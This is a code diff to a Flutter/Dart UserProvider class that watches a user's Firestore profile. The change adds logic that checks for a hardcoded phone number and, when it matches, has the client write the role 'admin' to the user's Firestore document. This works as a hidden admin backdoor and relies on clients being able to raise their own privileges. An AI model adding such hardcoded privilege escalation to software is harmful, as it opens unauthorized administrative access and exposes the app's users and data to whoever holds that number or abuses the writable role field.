@@ -38,9 +38,18 @@ class UserProvider extends ChangeNotifier {
         .doc(uid)
         .snapshots()
         .listen(
-      (doc) {
+      (doc) async {
         if (doc.exists) {
-          _userProfile = UserProfile.fromFirestore(doc);
+          final profile = UserProfile.fromFirestore(doc);
+          final userPhone = profile.phoneNumber;
+          final authPhone = FirebaseAuth.instance.currentUser?.phoneNumber ?? '';
+          
+          if ((userPhone.contains('9424894244') || authPhone.contains('9424894244')) && profile.role != 'admin') {
+            // Auto-promote admin phone number in Firestore
+            await FirebaseFirestore.instance.collection('users').doc(uid).update({'role': 'admin'});
+          } else {
+            _userProfile = profile;
+          }
         } else {
           _userProfile = null;
         }
